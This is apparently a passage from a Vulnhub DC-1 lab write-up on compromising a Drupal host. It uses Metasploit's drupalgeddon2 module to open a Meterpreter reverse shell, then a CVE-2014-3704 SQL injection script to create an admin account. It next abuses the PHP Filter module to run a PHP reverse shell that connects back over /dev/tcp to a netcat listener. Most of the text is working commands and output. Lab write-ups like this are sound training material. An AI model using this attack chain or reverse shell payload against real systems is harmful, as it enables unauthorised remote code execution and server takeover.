└─$ msfconsole -q
msf6 >
```
Now let's search for drupalgeddon2
```bash
msf6 > search drupalgeddon2

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/drupal_drupalgeddon2


msf6 >
```
Now we have to tell Metasploit we should use this explit with command `use` followed by the number of the exploit.
```bash
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > 
```
Let's now check the toptions what we can configure in the exploit.
```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/drupal_drupalgeddon2) >
```
The remote host is empty, let's enter the tartget with the following command: `set RHOST <IP-ADDRESS-TARGET>`
```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.0.2.30
RHOSTS => 10.0.2.30
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > 
```
To start the exploit, we just have to enter `run` and hit the enter key.
```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (39927 bytes) to 10.0.2.30
[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.30:44128) at 2023-03-26 13:54:38 +0200

meterpreter > 


```
Now let's check some system information with Metasploit.
```bash
meterpreter > sysinfo
Computer    : DC-1
OS          : Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686
Meterpreter : php/linux
meterpreter > 
```
Now let's have an interactive shell via the meterprester.
```
meterpreter > shell
Process 4268 created.
Channel 0 created.
whoami
www-data

```
From here the attack could be the same as the manual exploitation.

----
## Alternative 2 SQL Injection Drupal + reverse shell

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/DC-1]
└─$ python 34992.py -t http://10.0.2.30 -u emvee -p password

  ______                          __     _______  _______ _____
 |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |
 |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |
 |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |
 |:  1    /          |__|                 |   |  |:  1   | |:  |
 |::.. . /                                |   |  |::.. . | |::.|
 `------'                                 `---'  `-------' `---'
  _______       __     ___       __            __   __
 |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
 |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
 |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
 |:  1   |  |__|      |:  |    |___|
 |::.. . |            |::.|
 `-------'            `---'

                                 Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                              Admin 4cc0unt cr3at0r

                          Discovered by:

                          Stefan  Horst
                         (CVE-2014-3704)

                           Written by:

                         Claudio Viviani

                      http://www.homelab.it

                         info@homelab.it
                     homelabit@protonmail.ch

                 https://www.facebook.com/homelabit
                   https://twitter.com/homelabit
                 https://plus.google.com/+HomelabIt1/
       https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww


[!] VULNERABLE!

[!] Administrator user created!

[*] Login: emvee
[*] Pass: password
[*] Url: http://10.0.2.30/?q=node&destination=node

```
Signin with the new admin account.
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326140716.png){: width="700" height="400" }

The new user has admin privileges.
Click on Modules
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141033.png){: width="700" height="400" }


Scroll down and select the checkbox for PHP Filter.
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141146.png){: width="700" height="400" }

Scroll down to the bottom and click on the `Save Configuration` button.
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141247.png){: width="700" height="400" }

A confirmation is shown.
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141330.png){: width="700" height="400" }

Scroll down to `PHP Filter` again and click on `Permissions`
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141653.png){: width="700" height="400" }


Now enable the PHP filter for a specific group. In this case the admin group is enough.
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141829.png){: width="700" height="400" }

Scroll down and click on the `Save permissions` button.
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141920.png){: width="700" height="400" }

A confirmation is shown to us.
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141949.png){: width="700" height="400" }

Close the window and click `Add content`
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141416.png){: width="700" height="400" }

Now choose `Basic page`
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326141500.png){: width="700" height="400" }

At the dropdown menu by Text format choose: `PHP filter` 
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326142106.png){: width="700" height="400" }

Now enter a title. Paste a PHP reverse shell code into the body. Enable the page in the menu panel.
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15/1234 0>&1'");?>
```
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326143435.png){: width="700" height="400" }

Start a netcat listener on port 1234.
```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
```
Scroll down and click on the `Preview` button.
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326142654.png){: width="700" height="400" }


Wait a bit, there will pe a message that the preview is ready.
![Image](/assets/img/WriteUp/Vulnhub/DC1/Pasted image 20230326143206.png){: width="700" height="400" }

Then go back to the reverse shell.
```bash
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 1234
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.0.2.30.
Ncat: Connection from 10.0.2.30:33312.
bash: no job control in this shell
www-data@DC-1:/var/www$ whoami;id;hostname
whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
DC-1
www-data@DC-1:/var/www$ 

```
From here the attack could be the same as the manual exploitation.